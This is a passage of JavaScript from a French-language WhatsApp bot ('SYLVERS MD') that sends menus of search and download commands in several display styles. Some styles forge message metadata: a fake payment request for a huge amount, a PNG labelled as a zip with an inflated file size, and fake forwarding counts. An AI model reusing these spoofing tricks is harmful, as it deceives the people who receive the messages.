│${setv} │${prefix}ouverture 🅖
│${setv} │${prefix}fermeture 🅖
│${setv} │${prefix}reinitialiser 🅖
│${setv} │${prefix}voir-bio 🅖
│${setv} │${prefix}anti-virus 🅖
│${setv} │${prefix}anti-grosmot 🅖
│${setv} │${prefix}-18 🅖
│${setv} │${prefix}react 🅖
│${setv} │${prefix}getjoUSDequest 🅖
│${setv} ╰────────────╯
╰───────────────────╯`
if (typemenu === 's1') {
                    Kev.sendMessage(m.chat, {
                        image: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                        caption: kevmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's2') {
                    Kev.sendMessage(m.chat, {
                        text: kevmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 's3') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
                        caption: kevmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's4') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
                        caption: kevmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's5') {
                    Kev.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: kevmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 's6') {
                    Kev.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: kevmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 's7') {
                    Kev.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: kevmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 's8') {
                	Kev.sendMessage(m.chat, {
      video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
      gifPlayback: true,
      caption: kevmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/2800c0d2e02e3afcb4033.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 's9') {
                	Kev.sendMessage(m.chat, {
video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
caption: kevmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: global.xchannel.jid,
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://telegra.ph/file/2800c0d2e02e3afcb4033.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 's10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: kevmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Tout-Menu🧾","id":"${prefix}tout-menu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 's11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: kevmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Tout-Menu🧾","id":"${prefix}tout-menu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await Kev.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 's12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: kevmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU🧾",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"TOUT-MENU",
"title":"cliquez pour selectionner",
"description":"Afficher la liste de toutes les commandes",
"id":"${prefix}tout-menu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'menu-recherche': {
let kevmenu_oh = `
╭─✣「 *SYLVERS MD* 」✣─╮
│➠ *Hey 🍁*
│➠ *${m.pushName}* 
│➠ *${Kevinoutimewisher}* 
╰──────✣ ${readmore}
╭──✣「 *GUIDE* 」✣───╮
│➠ *🅟 = pour le proprio * 
│➠ *🅡 = Pour les randoms*
│➠ *🅑 =pour les boss*
╰────────────────╯
╭──✣「 *Recherche* 」✣─────╮
│${setv} ╭────────────╮
│${setv} │${prefix}google 🅡
│${setv} │${prefix}wikipedia 🅡
│${setv} │${prefix}ytsearch 🅡
│${setv} │${prefix}xnxxsearch 🅡
│${setv} │${prefix}xvideosearch 🅡
│${setv} │${prefix}apksearch 🅡
│${setv} │${prefix}stickersearch 🅡
│${setv} │${prefix}imdb 🅡
│${setv} │${prefix}wanumber 🅡
│${setv} │${prefix}friend 🅡
│${setv} │${prefix}lyrics 🅡
│${setv} │${prefix}pixiv 🅡
│${setv} ╰──────────╯
╰─────────────────╯`
if (typemenu === 's1') {
                    Kev.sendMessage(m.chat, {
                        image: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                        caption: kevmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's2') {
                    Kev.sendMessage(m.chat, {
                        text: kevmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 's3') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
                        caption: kevmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's4') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
                        caption: kevmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's5') {
                    Kev.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: kevmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 's6') {
                    Kev.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: kevmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 's7') {
                    Kev.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: kevmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 's8') {
                	Kev.sendMessage(m.chat, {
      video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
      gifPlayback: true,
      caption: kevmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/2800c0d2e02e3afcb4033.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 's9') {
                	Kev.sendMessage(m.chat, {
video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
caption: kevmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: global.xchannel.jid,
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://telegra.ph/file/2800c0d2e02e3afcb4033.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 's10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: kevmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Tout-Menu🧾","id":"${prefix}tout-menu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 's11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: kevmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Tout-Menu🧾","id":"${prefix}tout-menu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await Kev.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 's12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: kevmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU🧾",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"TOUT-MENU",
"title":"cliquez pour selectionner",
"description":"Afficher la liste de toutes les commandes",
"id":"${prefix}tout-menu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'menu-telechargement': {
let kevmenu_oh = `
╭─✣「 *SYLVERS MD* 」✣─╮
│➠ *Hey 🍁*
│➠ *${m.pushName}* 
│➠ *${Kevinoutimewisher}* 
╰──────✣ ${readmore}
╭──✣「 *GUIDE* 」✣────╮
│➠ *🅟 = pour le proprio * 
│➠ *🅡 = Pour les randoms*
│➠ *🅑 =pour les boss*
╰─────────────────╯
╭──✣「 *Telechargement* 」✣─╮
│${setv} ╭─────────╮
│${setv} │${prefix}xnxxdl 🅡        
│${setv} │${prefix}xvideodl 🅡     
│${setv} │${prefix}itunes 🅡
│${setv} │${prefix}play ??
│${setv} │${prefix}ytmp3 🅡
│${setv} │${prefix}ytmp4 🅡
│${setv} │${prefix}tiktok 🅡
│${setv} │${prefix}tiktokaudio 🅡
│${setv} │${prefix}tiktokvideo 🅡
│${setv} │${prefix}igvideo 🅡
│${setv} │${prefix}igimage 🅡
│${setv} │${prefix}facebook 🅡
│${setv} │${prefix}twitter 🅡
│${setv} │${prefix}apk 🅡
│${setv} │${prefix}mega 🅡
│${setv} │${prefix}mediafire 🅡
│${setv} │${prefix}google 🅡
│${setv} │${prefix}gimage 🅡
│${setv} │${prefix}meteo 🅡
│${setv} │${prefix}spotify 🅑
│${setv} │${prefix}gitclone 🅡
│${setv} │${prefix}happymod 🅡
│${setv} │${prefix}gdrive 🅡
│${setv} │${prefix}pinterest 🅡
│${setv} │${prefix}ringtone 🅡
│${setv} │${prefix}autodownload 🅟
│${setv} ╰───────────╯
╰──────────────────╯`
if (typemenu === 's1') {
                    Kev.sendMessage(m.chat, {
                        image: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                        caption: kevmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's2') {
                    Kev.sendMessage(m.chat, {
                        text: kevmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 's3') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
                        caption: kevmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's4') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
                        caption: kevmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's5') {
                    Kev.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: kevmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 's6') {
                    Kev.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: kevmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 's7') {
                    Kev.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: kevmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 's8') {
                	Kev.sendMessage(m.chat, {
      video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
      gifPlayback: true,
      caption: kevmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/2800c0d2e02e3afcb4033.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 's9') {
                	Kev.sendMessage(m.chat, {
video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
caption: kevmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: global.xchannel.jid,
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://telegra.ph/file/2800c0d2e02e3afcb4033.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 's10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: kevmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Tout-Menu🧾","id":"${prefix}tout-menu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 's11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: kevmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
